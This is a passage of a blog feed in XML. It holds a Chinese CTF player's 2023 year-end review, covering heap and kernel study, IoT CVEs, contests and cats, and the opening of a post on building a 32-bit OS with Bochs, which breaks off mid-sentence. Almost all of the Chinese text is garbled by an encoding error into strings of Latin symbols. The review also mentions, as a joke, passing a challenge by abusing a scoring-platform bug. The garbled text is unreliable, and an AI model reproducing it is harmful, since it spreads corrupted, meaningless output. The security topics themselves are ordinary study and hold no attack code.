    <content type="html"><![CDATA[<p><strong>å¾ˆå¤šäº‹ï¼Œæˆ‘èƒ½æƒ³é€šä¹Ÿèƒ½æ¥å—ï¼Œä½†æˆ‘å¾ˆéš¾è¿‡</strong></p><p>åŒ—äº¬è¿™å‡ å¤©åˆæ˜¯é›¾éœ¾ï¼Œå¼€å§‹æ€€å¿µå¤§é›ªåé‚£ä¸€æŠ¹å¹²å‡€çš„è”šè“ã€‚èµ°åœ¨è·¯ä¸Šï¼Œæ€»æœ‰ä¸€ç§å¸äºŒæ‰‹çƒŸçš„æŠ½è±¡æ„Ÿ</p><p>çœ¨çœ¼é—´2023ä¹Ÿå°±å‰©æœ€åä¸€å¤©äº†ï¼Œçœ‹ç¾¤å‹éƒ½åœ¨å‚¬å¹´ç»ˆæ€»ç»“ï¼ˆç»·ï¼‰ï¼Œä¹Ÿæ„Ÿè§‰ç¡®å®æœ‰å†™ä¸€äº›ä¸œè¥¿çš„å¿…è¦ï¼Œæ¥è®°å½•æˆ‘è¿™çœ‹ä¼¼å¿™ç¢Œå´åˆæ— ä¸ºçš„ä¸€å¹´</p><p>å‹æƒ…æç¤ºï¼Œç¬”è€…ä¼šå°½å¯èƒ½å‡å°‘æŠ½è±¡emojiçš„ä½¿ç”¨ï¼Œä½†æ˜¯ï¼Œè°åˆèƒ½è¯´çš„å‡†å‘¢ğŸ¥ºğŸ¥ºğŸ¥º</p><h1 id="Technology"><a href="#Technology" class="headerlink" title="Technology"></a>Technology</h1><p>è¿˜è®°å¾—2023çš„é’Ÿå£°ï¼Œæ˜¯åœ¨é—®ç‹å¸ˆå‚…å¦‚ä½•å­¦heapä¸­å“èµ·çš„</p><p>å¹´åˆæ‰“äº†N1 junior &amp;&amp; hgame 2023ï¼Œè¢«æ‘åœ¨åœ°ä¸Šä½¿åŠ²æ‘©æ“¦ï¼Œç„¶åé‚£æ®µæ—¶é—´å°±æ˜¯ç–¯ç‹‚çš„åˆ·é¢˜</p><p>å¥½åœ¨è¥¿æ¹–è®ºå‰‘çš„åˆèµ›æ²¡ç™½ç»™ï¼Œè™½ç„¶æ˜¯é“è¢«æ‰“çƒ‚çš„orwï¼Œä½†ç¬¬ä¸€æ¬¡èƒ½åœ¨å¤§æ¯”èµ›æœ‰è¾“å‡ºï¼Œè¿˜æ˜¯å¼€å¿ƒäº†å¥½ä¹…ã€‚</p><p>æœ€åå±±æ²³å“¥å“¥å·®ç‚¹æŠŠweb Aå®Œäº†ï¼Œå¸¦æˆ‘ä»¬è¿›äº†å†³èµ›ã€‚æŒºç¥å¥‡çš„ï¼Œä¸ºäº†æ‰“è¥¿æ¹–ä¸´æ—¶å‡‘çš„ä¸€æ”¯é˜Ÿä¼ï¼Œåæ¥å°±å˜æˆæ ¡é˜Ÿäº†å“ˆå“ˆå“ˆ</p><p>æ‰“äº†VNCTF 2023ï¼Œè„‘å­é“¸å¸äº†ï¼Œèµ›æ—¶åªå‡ºäº†ä¸€é“é¢˜ï¼Œè™½ç„¶èµ›åéé¢„æœŸäº†Pæ¡‘å‡ºçš„å—é€šå½•ï¼Œbutè¿˜æ˜¯è€»è¾±ä¸‹åœºå‘œå‘œ</p><p>æ€€ç€è¯•è¯•çš„å¿ƒæ€ç»™VNæŠ•äº†ç®€å†ï¼Œé¢è¯•çš„æ—¶å€™é«˜ç‰ˆæœ¬çš„off by nullç›´æ¥æ­‡é€¼ï¼ˆè™½ç„¶ç°åœ¨ä¹Ÿè¿˜æ˜¯ä¸çœ‹æ¿å­åšä¸å‡ºæ¥çš„FWï¼Œå †é£æ°´ç»™çˆ·æ­»å•Šï¼‰ï¼Œæœ€åeå®è¿˜æ˜¯æŠŠæˆ‘æ”¾äº†è¿›å»</p><p>åæ¥å¼€å§‹å­¦é«˜ç‰ˆæœ¬çš„å †åˆ©ç”¨ä»¥åŠè¿›é˜¶çŸ¥è¯†ï¼Œè¿™è¾¹ç‰¹åˆ«æ„Ÿè°¢<a href="https://www.roderickchan.cn/">roderick</a>å¸ˆå‚…çš„ä¼ æˆï¼</p><p>æœŸé—´ç»å†äº†D3å’Œé˜¿é‡Œäº‘è¿™ä¸¤é‡é‡çº§çš„å°çš®é­æ‹·æ‰“ï¼Œé“å¿ƒå½»åº•ç ´ç¢äº†ï¼Œç„¶åä¸çŸ¥é“è„‘å­æŠ½é£äº†è¿˜æ˜¯ä»€ä¹ˆï¼Œé“¸å¸ç¬”è€…åœ¨4æœˆä»½å¼€å§‹äº†kernelçš„å­¦ä¹ </p><p>æŠ±ç€A3ğŸ‘´çš„åšå®¢ç”Ÿå•ƒäº†ä¸€ä¸ªæœˆï¼Œç„¶åç¬”è€…å°±å†³å®šå½“é€ƒå…µäº†ï¼Œkernelæ˜¯ä¸€ç‚¹æ²¡å­¦ä¼šï¼ŒA3ğŸ‘´è¿™æŠ½è±¡emojiå€’æ˜¯å­¦ä¼šäº†ä¸å°‘ğŸ¤ªï¼ˆä½ è¯´æ˜¯å§ï¼‰</p><p>å­¦äº†ç‚¹qemu escapeã€musl libcï¼Œä½†éƒ½æ˜¯æµ…å°è¾„æ­¢ï¼Œç°åœ¨ä¹Ÿéƒ½å¿˜äº†å·®ä¸å¤šäº†ï¼Œæ‚²ã€‚ä½†æ˜¯è¿˜è¦æ„Ÿè°¢å¯çˆ±ç”·åŒeeeeå’Œpwn kingå˜‰ç¦¾å¸ˆå‚…èƒ½å›ç­”æˆ‘ä¸€äº›æœ‰å…³qemuçš„é—®é¢˜</p><p>æ¥ç€å°±æ˜¯å›½èµ›äº†ï¼Œåˆèµ›æ‘¸äº†ä¸ªååŒ—åˆ†åŒºç¬¬ä¸ƒï¼Œå¤ªå¤±è´¥äº†ã€‚é»‘ç¯ææ€è®©ğŸ‘´å¤§å¼€çœ¼ç•Œ</p><p>ååŒ—æ˜¯æœ€æ—©çš„ä¸¾è¡Œåˆ†åŒºèµ›çš„ï¼Œ6.10å°±æ‰“äº†å¥½åƒã€‚ylbå¥‡ç‰¹çš„break &amp; fixï¼Œå‡ºäº†ä¸‰é“pwnï¼Œæ²¡å½“æˆ˜çŠ¯ï¼Œæœ€åæœ‰ç‚¹å°é—æ†¾å§ï¼Œæ‹¿äº†ä¸ªäºŒç­‰å¥–ï¼Œæ¯•ç«ŸæŠ¥åçš„æ—¶å€™æ˜¯æŒ‰è§£é¢˜èµ›æ¨¡å¼ç»„çš„ã€‚å±±æ²³å“¥å“¥ä»–ä»¬ä¹Ÿæ‹¿åˆ°äº†å»å›½å†³çš„é—¨ç¥¨ï¼ŒçœŸçš„å¤ªæˆåŠŸäº†</p><p><img src="/img/2023zongjie/0.jpg"></p><p>å›½èµ›è¿‡åï¼Œæ¸æ¸å‘ç°è‡ªå·±å¥½åƒå·²ç»åŒå€¦äº†glibcï¼Œäºæ˜¯åœ¨NamelessğŸ‘´çš„å¸®åŠ©ä¸‹ï¼Œæˆ‘å¼€å§‹äº†Iotçš„å­¦ä¹ </p><p>å¾ˆå¹¸è¿ï¼Œåœ¨æš‘å‡æ‹¿åˆ°äº†ä¸‰ä¸ªCVEç¼–å·ï¼ˆCVE-2023-40915 &amp; CVE-2023-40041 &amp; CVE-2023-40042ï¼‰ï¼Œå¾ˆä¸å¹¸ï¼Œéƒ½æ˜¯ä½è´¨é‡æ°´æ´ï¼Œä¸”æ²¡æœ‰ä»»ä½•å®é™…ä»·å€¼ï¼Œtotolinkç”šè‡³è¿å›½åŒºçš„æŠ€æœ¯æ”¯æŒé‚®ç®±éƒ½downäº†</p><p>ä½ é—®æˆ‘ä¸ºä»€ä¹ˆæš‘å‡è¦å­¦iotï¼Œæ˜¯å–œæ¬¢å—ï¼Œå¯èƒ½æœ‰ä¸€ç‚¹ï¼Œæ¯•ç«Ÿæ˜¯å­¦äºŒè¿›åˆ¶æ¥ç¬¬ä¸€æ¬¡æ¥è§¦æ¯”è¾ƒrealworldçš„ä¸œè¥¿ï¼›ä½†æ˜¯æ›´å¤šçš„å¯èƒ½æ˜¯å¯¹kernelå’Œchromeçš„ç•æƒ§ï¼Œç»ˆç©¶æ˜¯ä¸ªæ‡¦å¤«ç½¢äº†å‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­ã€‚</p><p>æœŸé—´ä¹Ÿæµ…æµ…çš„å­¦ä¹ äº†fuzzï¼Œafl++ï¼Œboo-fuzzï¼Œéƒ½æ‘¸è¿‡ä¸€ç‚¹ï¼Œæœ€åˆçš„ç›®çš„æ˜¯æƒ³å­¦ä¹ fuzzä»¥æ­¤æ¥è‡ªåŠ¨åŒ–æŒ–æ˜Iotå›ºä»¶ï¼Œä½†åæ¥ä¹Ÿå°±ä¸äº†äº†ä¹‹äº†ã€‚</p><p>ä½†æ˜¯ï¼ŒfuzzçœŸçš„æ˜¯ä¸ªintrestingçš„ideaï¼Œè™½ç„¶æˆ‘ç°åœ¨æ›´å¤šç”¨è¿™ä¸ªideaæ¥è·‘C++è¿™ç§é€†ä¸å‡ºæ¥çš„crashã€‚</p><p>æ¥½</p><p>åœ¨æ­¤æ„Ÿè°¢winmtç‹æŒ‡å¯¼å’ŒNamelessğŸ‘´åœ¨æˆ‘å­¦ä¹ Iotçš„è¿‡ç¨‹ä¸­æä¾›çš„å¸®åŠ©ï¼</p><p>ä¹æœˆï¼Œç»ˆæ˜¯å¼€å­¦ã€‚</p><p>å½“äº†æ ¡é˜Ÿ22å±Šçš„è´Ÿè´£äººï¼Œäº‹æ˜¯çœŸçš„å¤š</p><p>ç¬¬ä¸€æ¬¡å¸¦é˜Ÿå»çº¿ä¸‹ï¼Œç¾ŠåŸæ¯ï¼Œè€»è¾±æˆ˜è´¥ï¼ŒğŸ‘´çº¯çº¯ç”²çº§æˆ˜çŠ¯</p><p>åé¢åˆè·‘äº†é™‡å‰‘å’Œè“å¸½åŠå†³èµ›ï¼Œä¹æœˆä»½å·®ä¸å¤šå°±æŠŠè¿™ä¸ªå­¦æœŸçš„æ¯”èµ›å·®æ—…ç»è´¹èŠ±å…‰äº†å“ˆå“ˆå“ˆ</p><p>å›½åº†å›æ¥å»å‚åŠ äº†ä¸“é¡¹ä»»åŠ¡ï¼Œå›æ¥åˆé©¬ä¸åœè¹„çš„ä¸¾åŠäº†æ‹›æ–°å®£è®²ï¼Œç­‰æ‰€æœ‰äº‹éƒ½å‘Šä¸€æ®µè½ï¼Œå·²ç»å¿«11æœˆäº†</p><p>å­¦æœŸå·²ç»è¿‡åŠäº†</p><p>åªèƒ½æ„Ÿå¹ï¼š</p><p>â€‹<strong>æˆ‘è’åºŸäº†æ—¶é—´ï¼Œæ—¶é—´ä¾¿æŠŠæˆ‘è’åºŸäº†</strong></p><p>ä¸“é¡¹å­¦äº†C++ï¼Œç„¶åå°±å¼€å§‹ç»™DASæœˆèµ›å’Œæ–°ç”Ÿèµ›å‡ºé¢˜ï¼ŒDASé‚£é“shaopiçœŸçš„å¯¹ä¸èµ·ï¼Œç»™å¸ˆå‚…ä»¬ç£•å‡ ä¸ªå‘œå‘œ</p><p>è¯´èµ·DASæœˆèµ›ï¼Œè¿™æ˜¯æˆ‘ä»¬æ ¡é˜Ÿç¬¬ä¸€æ¬¡ä¸¾åŠå“ˆå“ˆï¼Œæˆ‘å’Œå‘¨å“¥è¿˜åœ¨é¢˜ç›®äº†è—äº†å½©è›‹</p><p><img src="/img/2023zongjie/0.png"></p><p><del>SæŸå’ŒBæŸåˆ°åº•æ˜¯è°å‘¢ï¼Ÿ</del></p><p>11æœˆä»½çš„å‡ åœºçº¿ä¸Šåˆå½“æˆ˜çŠ¯äº†ï¼Œå“ï¼Œå…¶å®æœ‰ä¸ªåˆ«çœŸçš„æŒºä¸æƒ³ä¸Šçº¿çš„ï¼Œè½©å“¥å¿«æ¯•ä¸šäº†å¾ˆå¿™ï¼Œèƒ½æ‰“pwnçš„å°±æˆ‘ä¸€ä¸ª</p><p>å¥½åœ¨12æœˆçš„å¼ºç½‘æ²¡æ‹–åè…¿ï¼Œèƒ½åšçš„éƒ½åšäº†ã€‚ä½†æ’åè¿˜æ˜¯åœ¨32å¤–é¢å‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­</p><p>å“¦å¿˜äº†è¿˜æœ‰äº¬éº’çº¿ä¸‹ï¼Œæœ‰ä¸ªç¥å¥‡çš„å±Œå›¾</p><p><img src="/img/2023zongjie/1.jpg"></p><p>ä½ é—®æˆ‘ä»¬zopchainæ€ä¹ˆåšå‡ºæ¥çš„ï¼ŒğŸ‘´ä¹Ÿä¸çŸ¥é“ï¼ˆå°å£°é€¼é€¼ï¼Œå½“æ—¶å¹³å°æœ‰bugï¼Œä¸¤é“ä¸åŒçš„é¢˜åœ¨1ç§’å†…æäº¤flagï¼Œåªè¦æœ‰ä¸€ä¸ªflagå¯¹ï¼Œä¸¤é“é¢˜éƒ½ä¼šè¿‡checkï¼‰</p><p>ç„¶åï¼Œå°±æ²¡æœ‰ç„¶åäº†</p><p>æˆ‘è‡ªå·±ä¹Ÿå›°æƒ‘è¿™ä¸€å¹´æˆ‘åˆ°åº•åœ¨å­¦ä»€ä¹ˆï¼Œå¹´åˆæ˜¯heapåˆ°å¹´æœ«äº†å¥½åƒä¹Ÿè¿˜æ˜¯heapï¼ˆè¯´çš„å°±æ˜¯ä½ warm up !ï¼‰</p><p>æƒ³äº†æƒ³ï¼Œå…œå…œè½¬è½¬è¿˜æ˜¯å›åˆ°äº†kernelçš„èµ·ç‚¹</p><p>è¿˜æ˜¯å¿˜ä¸äº†è¿™classicçš„ç¾å­¦</p><p>md2024ğŸ‘´tmå’Œkernerlåªèƒ½æ´»ä¸€ä¸ªï¼</p><h1 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h1><p>ä»Šå¹´æœ€é‡è¦çš„äº‹ï¼Œå½“ç„¶æ˜¯å®¶é‡Œæ¥äº†ä¸ªå°å®¶ä¼™</p><p><img src="/img/2023zongjie/2.jpg"></p><p>6ä¸ªæœˆå¤§çš„å°å¯çˆ±</p><p><img src="/img/2023zongjie/3.jpg"></p><p>10ä¸ªæœˆå¤§çš„10æ–¤é‡çš„çŒªçœ¯</p><p><img src="/img/2023zongjie/4.jpg"></p><p>çŒ«çŒ«å¤©ä¸‹ç¬¬ä¸€ï¼</p><p>7æœˆä»½çš„æ—¶å€™ï¼Œè¶ç€å¤§å®¶åœ¨åˆè‚¥æ‰“å›½å†³ï¼Œå’ŒVNçš„å°ä¼™ä¼´ä»¬é¢äº†åŸº</p><p>è§åˆ°äº†å¯çˆ±å—ç«¥eå®ï¼ˆè¿™Bæ˜¯çœŸå¨ƒå¨ƒè„¸å•Šï¼‰ï¼Œå¯çˆ±æ¸©æŸ”åˆå¸…æ°”çš„telå“¥å“¥ï¼Œç´ è´¨å¤©èŠ±æ¿å¤§Bè€å¸ˆï¼Œå¯†ç è¶…äººdbtï¼Œè¿˜æœ‰å¤šå¾ˆå¤šå¤§å¸ˆå‚…</p><p>è§è¯†äº†eeeeçš„ç©¶æå˜´ç¡¬å’Œéƒ½æ˜¯æ°´æœçš„é…’æ¯ï¼Ÿï¼ˆå§‘ä¸”ç®—æ˜¯é…’æ¯ä¸æ˜¯æ°´æœæ¯å§ï¼‰</p><p><img src="/img/2023zongjie/1.png"></p><p>å“¦ï¼Œè¿˜æœ‰ç¥å¥‡çš„æˆ˜è´¥åŒºï¼Œè™½ç„¶æ²¡æœ‰æˆ˜è´¥CGå°±æ˜¯äº†ï¼ˆå·®è¯„ï¼Œå™«ï¼Œæˆ‘å¥½åƒä¹Ÿåœ¨é‡Œé¢ï¼Œå“’å’©ï¼ï¼‰</p><p><img src="/img/2023zongjie/2.png"></p><p>åœ¨å»å…°å·çš„é£æœºä¸Šï¼Œæ‹äº†å¼ æŒºæ„Ÿæ…¨çš„ç…§ã€‚æˆ–è®¸è¿™æ‰æ˜¯åƒæ²Ÿä¸‡å£‘å§</p><p><img src="/img/2023zongjie/5.jpg"></p><p>å¸ˆå¼Ÿå†›è®­ç»“æŸå¼€æ–­çš„ç”µçº¿æ†ï¼Œå¤ªæ®‹æš´äº†</p><p><img src="/img/2023zongjie/6.jpg"></p><p>ç»ˆäºåœ¨åŒ—äº¬ç­‰åˆ°äº†å¤§é›ªï¼Œä½ è¯´é›ªæ™¯å•Šè¿˜çœŸä¸è®°å¾—å¤šå°‘ï¼Œå€’æ˜¯ä¸¤ä¸ªæ˜ŸæœŸçš„ä¸ç”¨æ—©é›†åˆå°è±¡æ·±åˆ»ï¼Œç»ˆäºä¸æ˜¯6ï¼š10èµ·äº†å¦ˆå¦ˆç”Ÿçš„</p><p>æœ€é»‘æš—çš„ä¸€é›†</p><p><img src="/img/2023zongjie/7.jpg"></p><p>ä»è¶…å¸‚ä¹°ä¸œè¥¿å›æ¥éšæ‰‹æ‹çš„</p><p><img src="/img/2023zongjie/8.jpg"></p><p>è¿˜æœ‰ä»€ä¹ˆå€¼å¾—å›å¿†çš„ç‚¹å—ï¼Œæˆ–è®¸è¿˜æœ‰å§</p><p>ä½†éœ€è¦åˆ»æ„å»æƒ³çš„ï¼Œè¿˜å«å›å¿†å—</p><h1 id="Love-0-o"><a href="#Love-0-o" class="headerlink" title="Love ??? 0.o"></a>Love ??? 0.o</h1><p>PASSï¼ï¼ï¼ğŸ‘´æ¯èƒsolo19å¹´ï¼Œè¿å¥³å­©å­çš„æ‰‹éƒ½æ²¡ç‰µè¿‡å‘œå‘œå‘œ</p><p>ä»¥å‰ä¸€ç›´å¥‡æ€ªwinmtç‹æŒ‡å¯¼æ€ä¹ˆè¿™ä¹ˆæƒ³æ‰¾npy</p><p>æ²¡æƒ³åˆ°æˆ‘ä¹Ÿæ˜¯å°ä¸‘ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><h1 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h1><p>è½¬çœ¼å¤§äºŒä¸Šå°±ç»“æŸäº†ï¼Œå¯’å‡æ‰¾äº†ä»½å¥‡æ€ªçš„å®ä¹ ï¼ˆå§‘ä¸”å¯ä»¥è¿™ä¹ˆè¯´å§ï¼‰</p><p>çœ‹çœ‹èƒ½ä¸èƒ½åœ¨æ˜å¹´çš„æš‘å‡æ‰¾ä¸€ä»½æ­£ç»çš„å®‰å…¨å²—å®ä¹ ï¼Œæˆ–è€…å»ä¸Šæµ·æŸä¸­å¿ƒæ‰“å·¥</p><p>è™½ç„¶æœªæ¥å¤§æ¦‚ç‡ç¡®å®šäº†ï¼Œä½†æ˜¯è°åˆçŸ¥é“å‘¢ğŸ¤”ğŸ¤”ğŸ¤”</p><p>æˆ–è®¸æ˜¯æµ™æ±Ÿç½‘å®‰å¤ªå¼ºï¼Œè¿˜æ˜¯å› ä¸ºåˆ«çš„ï¼Œä¸€ç›´æ²¡å¬åˆ°æµ™æ±Ÿæœ‰ç‰¹æ‹›</p><p>ä½†å–è¯å’Œæ¸—é€ä¹Ÿè¯¥å¼€å§‹ä¸Šæ‰‹äº†ï¼Œæ¯•ç«Ÿç³»ç»Ÿé‡ŒäºŒè¿›åˆ¶å¥½åƒçœŸä¸èƒ½å½“é¥­åƒå‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­</p><h1 id="another-thing"><a href="#another-thing" class="headerlink" title="another thing"></a>another thing</h1><p>ç»ˆç©¶è¿˜æ˜¯æ²¡æœ‰å®åŠ›å‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­</p><p>æ˜å¹´å°±å’Œkernelã€å–è¯ã€æ¸—é€æ­»ç£•ä¸Šäº†ï¼Œè™½ç„¶è®¡åˆ’æ°¸è¿œèµ¶ä¸ä¸Šå˜åŒ–å°±æ˜¯äº†</p><p>å¸Œæœ›24å›½èµ›èƒ½ä¿äºŒäº‰ä¸€ä¸‹ä¸€å§ï¼ŒğŸ‘´æ˜¯çœŸä¸æƒ³æ‰“è¿™æŠ½è±¡æ¯”èµ›ï¼Œä½†æ˜¯ğŸ‘´æƒ³æ—©ç‚¹é€€ä¼‘ï¼Œä¸å¾—ä¸æ‰“ã€‚å•Šä¸å¯¹ï¼ŒğŸ‘´æ€ä¹ˆè¿™ä¹ˆè‡ªä¿¡ï¼Œä¸‡ä¸€ååŒ—åˆ†åŒºå¯„äº†ä¸æ˜¯å¾ˆå°´å°¬ğŸ¤”ğŸ¤”ğŸ¤”</p><p>å°è¯•å¤šæ‰“æ‰“å›½å¤–èµ›ï¼Œå°‘ä¸€ç‚¹åˆ©ç›Šï¼Œå¤šä¸€ç‚¹ä¹è¶£ï¼Œé˜¿é—¨</p><p>æ˜å¹´æš‘å‡æƒ³å»ä¸€æ¬¡åŒ—ç–†æˆ–è€…è¥¿è—ï¼Œææ­å­å‘œå‘œ</p><p>å¤šå‡ºå»èµ°èµ°ï¼Œä»Šå¹´åŸºæœ¬ä¸Šå‡æœŸéƒ½èœ—ç€ï¼Œæˆ‘å¥½åƒä¸€å¹´æ—¶é—´ä¸ç®—ä¸Šå‡ºå»æ¯”èµ›ï¼Œåªå‡ºäº†3æ¬¡æ ¡ï¼ˆå¦ˆå¦ˆç”Ÿçš„ï¼‰ã€‚æ„Ÿè§‰å·²ç»æ˜¯20å²çš„å¹´é¾„ï¼Œ40å²çš„é¢ˆæ¤äº†å‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­</p><h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p>æ„Ÿè°¢roderickå¸ˆå‚…çš„æ— ç§æ•™å¯¼</p><p>æ„Ÿè°¢winmtã€Namelessã€wjhã€eeeeã€kortoriseedã€Pæ¡‘ç­‰å¤§å¸ˆå‚…åœ¨å­¦ä¹ é“è·¯çš„å¸®åŠ©</p><p>æ„Ÿè°¢ V&amp;N çš„å°ä¼™ä¼´ä»¬ï¼ŒV&amp;NçœŸçš„çœŸçš„æ˜¯ä¸ªå¾ˆæ£’çš„teamï¼ï¼ï¼ç¬¬ä¸€æ¬¡åœ¨ç½‘ç»œä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªæœ‰å½’å±æ„Ÿçš„åœ°æ–¹</p><p>æ„Ÿè°¢æ ¡é˜Ÿ0psu3ä¸­çš„æ¯ä¸ªäººï¼Œè¿™ä¸€å¹´æ¥æ”¶è·äº†å¤ªå¤šå¤ªå¤š</p><p>æ„Ÿè°¢ice bagè¿™ä¸ªç¥å¥‡çš„ç¾¤èŠä¸­é™ªæˆ‘å¹æ°´çš„6ä¸ªäºŒè´§</p><p>ä»¥åŠ</p><p>æ„Ÿè°¢å±å¹•å‰çš„ä½ æŠ½å‡ºæ—¶é—´è¯»å®Œkoreyçš„ç¢ç¢å¿µ</p><h1 id="The-end"><a href="#The-end" class="headerlink" title="The end"></a>The end</h1><p><strong>å‡¡æ˜¯è¿‡å»ï¼Œçš†ä¸ºåºç« ã€‚</strong></p><p>äº<del>ç™¾äº¬å¤§å…´ç”·å­ç›‘ç‹±</del>å›¢æ²³</p><p>2023.12.31</p>]]></content>
    
    
    <categories>
      
      <category>shellä¹‹å¤–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¢ç¢å¿µ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºä½œæ­»è¯•å›¾æ“ä¸€ä¸ª32ä½æ“ä½œç³»ç»Ÿä¸å¾—ä¸è¯´çš„äº‹</title>
    <link href="/2023/11/20/OS/"/>
    <url>/2023/11/20/OS/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x0-å†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x0:å†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p>æœ¬æ¥åœ¨ç¬”è€…çš„è®¡åˆ’ä¸­ï¼Œæ‰‹æ“ä¸€ä¸ªç®€æ˜“çš„æ“ä½œç³»ç»Ÿæ˜¯åœ¨æš‘å‡å°±è¯¥å®Œæˆçš„äº‹æƒ…ï¼Œç»“æœç¬”è€…æ˜¯åªæ‡’ğŸ¶ï¼Œè€Œä¸”å½“æ—¶ä¸€ç›´åœ¨æfuzzå’Œiot<del>ï¼ˆä½†å¥½åƒä¹Ÿæ²¡æå‡ºä»€ä¹ˆä¸œè¥¿æ¥ï¼Œåªæ˜¯å•çº¯çš„åœ¨æ‘¸é±¼ç½¢äº†ï¼‰</del>ã€‚</p><p>ç„¶åå‘¢ç¬”è€…æœ€è¿‘æƒ³é‡å¼€kernelï¼Œé™ä¸‹å¿ƒæ¥å¥½å¥½å­¦ç‚¹å†…æ ¸ã€‚ä½†ææŒ‡ä¸€ç®—å¥½åƒè¿˜æœ‰ä¸¤ä¸ªæ˜ŸæœŸå°±åˆ°æœŸæœ«å‘¨äº†ï¼Œå­¦ä¸ªğŸ•8</p><p>ğŸ‘´å½“ğŸ“ç«‹æ–­ä¸å¦‚çœ‹ç‚¹ä¹¦ï¼Œå‚è€ƒä¸€ä¸‹ã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹ï¼ŒåŸºç¡€èƒ½æ‰“ä¸€ç‚¹æ˜¯ä¸€ç‚¹ã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><h3 id="bochså®‰è£…"><a href="#bochså®‰è£…" class="headerlink" title="bochså®‰è£…"></a>bochså®‰è£…</h3><p><a href="https://sourceforge.net/projects/bochs/files/bochs/">Bochs x86 PC emulator - Browse &#x2F;bochs at SourceForge.net</a></p><p>æ‰¾ä¸ªç‰ˆæœ¬ä¸‹è½½å¹¶è§£å‹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/your/path/yo/bochs</span> <span class="hljs-params">--enable-debugger</span> <span class="hljs-params">--enable-disasm</span> <span class="hljs-params">--enable-iodebug</span> <span class="hljs-params">--enable-x86-debugger</span> <span class="hljs-params">--with-x</span> <span class="hljs-params">--with-x11</span><br>$ make<br>$ make install<br></code></pre></td></tr></table></figure><p><code>bochs</code>æ”¯æŒè‡ªå¸¦çš„<code>debug</code>å’Œ<code>gdb</code>ï¼ˆç¼–è¯‘çš„æ—¶å€™-<code>-enable-debugger</code>å˜æˆ<code>--enable-gdb-stub</code>ï¼‰ï¼Œä½†gdbè¿™é€‚é…åšçš„æ˜¯ä¸€å¨shitï¼Œå»ºè®®ç›´æ¥ç”¨<code>bochs</code>è‡ªå¸¦çš„</p><p>é…ç½®æ–‡ä»¶ï¼ŒæŠ„çš„A3ğŸ‘´çš„å‘œå‘œï¼ŒæŠŠ<code>share/doc/bochs/bochsrc-sample.txt</code>é‡Œçš„æ”¹ä¸€æ”¹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">megs: 32<br>romimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/BIOS-bochs-latest<br>vgaromimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/VGABIOS-lgpl-latest<br>ata0-master: <span class="hljs-attribute">type</span>=disk, <span class="hljs-attribute">mode</span>=flat, <span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;img.img&quot;</span><br>cpu: <span class="hljs-attribute">model</span>=pentium, <span class="hljs-attribute">count</span>=1, <span class="hljs-attribute">ips</span>=50000000, <span class="hljs-attribute">reset_on_triple_fault</span>=1, <span class="hljs-attribute">ignore_bad_msrs</span>=1, <span class="hljs-attribute">msrs</span>=<span class="hljs-string">&quot;msrs.def&quot;</span><br><span class="hljs-comment"># following lines need to be added by yourself</span><br>keyboard: <span class="hljs-attribute">type</span>=mf, <span class="hljs-attribute">serial_delay</span>=250 <span class="hljs-attribute">keymap</span>=./bochs/share/bochs/keymaps/x11-pc-us.map<br><span class="hljs-comment">#sound: driver=default, waveout=/dev/dsp. wavein=, midiout= </span><br></code></pre></td></tr></table></figure><h3 id="bochs-è°ƒè¯•"><a href="#bochs-è°ƒè¯•" class="headerlink" title="bochs è°ƒè¯•"></a>bochs è°ƒè¯•</h3><p>å¤§éƒ¨åˆ†è°ƒè¯•å‘½ä»¤å’Œgdbä¸€æ ·ï¼Œæœ‰å‡ ä¸ªç‰¹æ®Šçš„</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> mode:æ¯æ¬¡ CPU å˜æ¢æ¨¡å¼æ—¶å°±æç¤ºï¼Œæ¨¡å¼æ˜¯æŒ‡ä¿æŠ¤æ¨¡å¼ã€å®æ¨¡å¼ï¼Œæ¯”å¦‚ä»å®æ¨¡å¼è¿›å…¥åˆ°ä¿æŠ¤æ¨¡å¼æ—¶ä¼šæœ‰æç¤º<br><br><span class="hljs-keyword">show</span> <span class="hljs-type">int</span>:æ¯æ¬¡æœ‰ä¸­æ–­æ—¶å°±æç¤º p åŒæ—¶æ˜¾ç¤ºä¸‰ç§ä¸­æ–­ç±»å‹ï¼Œè¿™ ä¸‰ 